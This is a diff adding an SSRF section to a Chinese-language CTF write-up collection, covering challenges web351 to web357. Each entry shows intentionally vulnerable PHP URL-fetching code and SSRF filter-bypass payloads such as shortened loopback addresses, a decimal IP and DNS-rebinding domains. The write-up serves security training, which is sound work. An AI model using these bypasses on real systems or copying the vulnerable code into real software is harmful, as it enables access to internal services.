@@ -4725,6 +4725,284 @@ $vip->getFlag();
 
 根据题目提示存在flag.php页面且只允许
 
+
+
+### SSRF
+
+#### web351
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST['url'];
+$ch=curl_init($url);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$result=curl_exec($ch);
+curl_close($ch);
+echo ($result);
+?>
+```
+
+没有过滤，直接读文件
+
+Payload:
+
+```
+url=127.0.0.1/flag.php
+url=localhost/flag.php
+```
+
+#### web352
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST['url'];
+$x=parse_url($url);
+if($x['scheme']==='http'||$x['scheme']==='https'){
+if(!preg_match('/localhost|127.0.0/')){
+$ch=curl_init($url);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$result=curl_exec($ch);
+curl_close($ch);
+echo ($result);
+}
+else{
+    die('hacker');
+}
+}
+else{
+    die('hacker');
+}
+?>
+```
+
+这道题限制了只能使用http和https协议
+
+同时也添加了过滤
+
+```
+if(!preg_match('/localhost|127.0.0/'))
+```
+
+缺省法
+
+payload：
+
+```
+url=http://127.1/flag.php
+
+url=http://0/flag.php
+//windows中解析为0.0.0.0
+//linux解析为127.0.0.1
+```
+
+or
+
+使用十进制绕过
+
+payload：
+
+```
+url=http://2130706433/flag.php
+```
+
+#### web353
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST['url'];
+$x=parse_url($url);
+if($x['scheme']==='http'||$x['scheme']==='https'){
+if(!preg_match('/localhost|127\.0\.|\。/i', $url)){
+$ch=curl_init($url);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$result=curl_exec($ch);
+curl_close($ch);
+echo ($result);
+}
+else{
+    die('hacker');
+}
+}
+else{
+    die('hacker');
+}
+?>
+```
+
+过滤
+
+```
+!preg_match('/localhost|127\.0\.|\。/i', $url)
+```
+
+这题依旧可以用上题方法解决
+
+其他payload：
+
+```
+// 127.0.0.1 ~ 127.255.255.254 都表示 localhost
+
+url=http://127.255.255.254/flag.php
+```
+
+127开头都会被解析为localhost
+
+#### web354
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST['url'];
+$x=parse_url($url);
+if($x['scheme']==='http'||$x['scheme']==='https'){
+if(!preg_match('/localhost|1|0|。/i', $url)){
+$ch=curl_init($url);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$result=curl_exec($ch);
+curl_close($ch);
+echo ($result);
+}
+else{
+    die('hacker');
+}
+}
+else{
+    die('hacker');
+}
+?>
+```
+
+这道题的1和0都被过滤了，我们可以用dns重定向的方法来绕过
+
+网络上存在一个域名sudo.cc会重定向到127.0.0.1
+
+payload:
+
+```
+url=http://sudo.cc/flag.php
+```
+
+其他方法
+
+可以用自己的域名进行dns重定向
+
+或者通过 http://ceye.io/
+
+#### web355
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST['url'];
+$x=parse_url($url);
+if($x['scheme']==='http'||$x['scheme']==='https'){
+$host=$x['host'];
+if((strlen($host)<=5)){
+$ch=curl_init($url);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$result=curl_exec($ch);
+curl_close($ch);
+echo ($result);
+}
+else{
+    die('hacker');
+}
+}
+else{
+    die('hacker');
+}
+?>
+```
+
+这道题对host的长度进行了限制，但是由于没有进行过滤我们可以用0来代替127.0.0.1
+
+payload：
+
+```
+url=http://0/flag.php
+```
+
+or
+
+```
+url=http://127.1/flag.php
+```
+
+
+
+#### web356
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST['url'];
+$x=parse_url($url);
+if($x['scheme']==='http'||$x['scheme']==='https'){
+$host=$x['host'];
+if((strlen($host)<=3)){
+$ch=curl_init($url);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$result=curl_exec($ch);
+curl_close($ch);
+echo ($result);
+}
+else{
+    die('hacker');
+}
+}
+else{
+    die('hacker');
+}
+?>
+```
+
+payload:
+
+```
+url=http://0/flag.php
+```
+
+#### web357
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST['url'];
+$x=parse_url($url);
+if($x['scheme']==='http'||$x['scheme']==='https'){
+$ip = gethostbyname($x['host']);
+echo '</br>'.$ip.'</br>';
+if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
+    die('ip!');
+}
+
+
+echo file_get_contents($_POST['url']);
+}
+else{
+    die('scheme');
+}
+?>
+```
+
+
+
 ### **Java反序列化：**
 
 #### web846
